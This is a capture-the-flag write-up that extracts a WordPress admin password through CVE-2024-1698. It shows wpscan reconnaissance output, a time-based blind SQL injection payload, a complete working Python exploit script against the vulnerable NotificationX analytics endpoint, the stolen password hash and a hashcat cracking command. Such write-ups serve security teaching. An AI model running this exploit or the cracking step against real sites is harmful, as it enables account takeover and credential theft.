# CTF Week #8 (SQL Injection)

## Recognition

In this CTF, the goal was to extract the admin password of a given website.

We started by gathering information about the website, specifically the installed software. On the homepage, we found that the site was running on WordPress. To gather additional information, we used the `wpscan` tool with the command: `wpscan --url http://44.242.216.18:5008/`

The output:
```
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ Â®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.27
                               
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] Updating the Database ...
[i] Update completed.

[+] URL: http://44.242.216.18:5008/ [44.242.216.18]
[+] Started: Sat Nov 16 22:22:53 2024

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Apache/2.4.56 (Debian)
 |  - X-Powered-By: PHP/8.0.28
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://44.242.216.18:5008/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://44.242.216.18:5008/xmlrpc.php
 | Found By: Headers (Passive Detection)
 | Confidence: 100%
 | Confirmed By: Direct Access (Aggressive Detection), 100% confidence
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://44.242.216.18:5008/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://44.242.216.18:5008/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.7 identified (Latest, released on 2024-11-12).
 | Found By: Rss Generator (Passive Detection)
 |  - http://44.242.216.18:5008/feed/, <generator>https://wordpress.org/?v=6.7</generator>
 |  - http://44.242.216.18:5008/comments/feed/, <generator>https://wordpress.org/?v=6.7</generator>
 |  - http://44.242.216.18:5008/sample-page/feed/, <generator>https://wordpress.org/?v=6.7</generator>

[+] WordPress theme in use: twentytwentythree
 | Location: http://44.242.216.18:5008/wp-content/themes/twentytwentythree/
 | Last Updated: 2024-07-16T00:00:00.000Z
 | Readme: http://44.242.216.18:5008/wp-content/themes/twentytwentythree/readme.txt
 | [!] The version is out of date, the latest version is 1.5
 | Style URL: http://44.242.216.18:5008/wp-content/themes/twentytwentythree/style.css
 | Style Name: Twenty Twenty-Three
 | Style URI: https://wordpress.org/themes/twentytwentythree
 | Description: Twenty Twenty-Three is designed to take advantage of the new design tools introduced in WordPress 6....
 | Author: the WordPress team
 | Author URI: https://wordpress.org
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | Version: 1.1 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://44.242.216.18:5008/wp-content/themes/twentytwentythree/style.css, Match: 'Version: 1.1'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] notificationx
 | Location: http://44.242.216.18:5008/wp-content/plugins/notificationx/
 | Last Updated: 2024-10-27T10:43:00.000Z
 | [!] The version is out of date, the latest version is 2.9.2
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | Version: 2.8.1 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://44.242.216.18:5008/wp-content/plugins/notificationx/README.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://44.242.216.18:5008/wp-content/plugins/notificationx/README.txt

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:07 <=> (137 / 137) 100.00% Time: 00:00:07

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Sat Nov 16 22:23:14 2024
[+] Requests Done: 190
[+] Cached Requests: 7
[+] Data Sent: 48.415 KB
[+] Data Received: 21.973 MB
[+] Memory used: 269.699 MB
[+] Elapsed time: 00:00:20
```

As we can see, the `wpscan` tool identified that the NotificationX plugin was outdated (latest version: 2.9.2), which presented a possible attack vector.

## CVE Research

Using the [CVE database](https://cve.mitre.org/), we queried for vulnerabilities affecting:

* WordPress version 6.7
* NotificationX version 2.8.1
* SQL Injection 

`CVE-2024-1698` is known vulnerability with 9.8 CRITICAL CVSS score, that works on NotificationX plugin for WordPress in all versions up to and including 2.8.2 (patched in 2.8.3). Plugin is vulnerable to SQL Injection via the `type` parameter on the `notificationx/v1/analytics` endpoint.

## Exploit

To exploit the vulnerability, we used script found in the [GitHub Repository](https://github.com/shanglyu/CVE-2024-1698).

Some explanation:

The exploit works by using blind SQL injection with a timing-based attack to infer information about the database. The vulnerability lies in the type parameter, which is passed into an SQL query without proper sanitization.

The attacker sends payloads that include the `SLEEP()` function to create a delay if a condition is true.
```sql
IF(ASCII(SUBSTRING((SELECT user_pass FROM wp_users WHERE id=1), <letter_position>, 1))=<letter>, SLEEP(10), NULL)-- -
```
It checks if `<letter_position>` character of the admin's password hash has an ASCII value `<letter>`, and if it true it will it will have 10 second delay. The code from the repository automates this process.


Code used for attack, (we updated the `url` variable and set `delay_time` to 10 seconds.)
```py
import requests
from sys import exit

delay_time = 10

url = "http://44.242.216.18:5008/wp-json/notificationx/v1/analytics"

session = requests.Session()

query_user = "SELECT user_login FROM wp_users WHERE id=1"
query_pass = "SELECT user_pass FROM wp_users WHERE id=1"

def get_data(query,field_name):
    result = ""
    for char_position in range(1,40):
        for ascii_value in range(256):
            payload = {
                "nx_id" : 10,
                "type" : f"clicks`=IF(ASCII(SUBSTRING(({query}),{char_position},1)) = {ascii_value}, sleep({delay_time}),null)-- -"
            }
            response = session.post(url, data=payload)
            
            if response.elapsed.total_seconds() > delay_time:
                result += chr(ascii_value)
                print(result)
                if ascii_value == 0: #null byte
                    print(f"[*]{field_name} : {result}")
                    return result
                break

username = get_data(query_user, "Username")
password_hash = get_data(query_pass, "Password hash")
```

The output:

<p align="center" justify="center">
  <img src="./assets/CTF8/result.png"/>
</p>

The hashed admin's password: `$P$BuRuB0Mi3926H8h.hcA3pSrUPyq0o10`.

## Findong the Password

The admin's password was stored as a hash using the default PHPass mechanism.

To crack the retrieved hash, we used the tool Hashcat, command used: `hashcat -O -m 400 -a 0 -o cracked.txt hash.txt rockyou.txt`.

The rockyou.txt we got from this [link](https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt).

The flag is stored in `cracked.txt`.
